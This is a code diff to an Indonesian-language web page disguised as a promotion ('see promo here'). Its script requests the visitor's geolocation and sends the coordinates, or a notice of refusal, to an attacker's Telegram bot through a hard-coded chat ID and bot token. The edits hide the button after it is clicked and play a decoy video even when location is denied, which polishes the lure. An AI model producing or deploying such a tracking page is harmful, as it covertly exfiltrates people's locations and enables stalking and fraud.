@@ -19,7 +19,6 @@
       background-color: #f0f0f0;
     }
 
-    /* Tombol besar */
     .tombol-promo {
       font-size: 24px;
       padding: 20px 40px;
@@ -38,12 +37,12 @@
     #videoContainer {
       display: none;
       margin-top: 20px;
-      border: 2px solid red;
+      border: 2px solid white;
     }
   </style>
 </head>
 <body>
-  <button class="tombol-promo" onclick="mintaLokasi()">lihat promo disini</button>
+  <button id="tombolPromo" class="tombol-promo" onclick="mintaLokasi()">lihat promo disini</button>
 
   <div id="videoContainer">
     <video width="320" height="240" controls autoplay>
@@ -57,6 +56,9 @@
     const chatId = "7420684427";
 
     function mintaLokasi() {
+      // Sembunyikan tombol
+      document.getElementById("tombolPromo").style.display = "none";
+
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
           (pos) => {
@@ -73,6 +75,9 @@
             const pesan = `Pengguna menolak memberikan lokasi.`;
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(pesan)}`);
             console.log("Lokasi ditolak.");
+
+            // Tetap tampilkan video meskipun lokasi ditolak
+            document.getElementById("videoContainer").style.display = "block";
           }
         );
       } else {
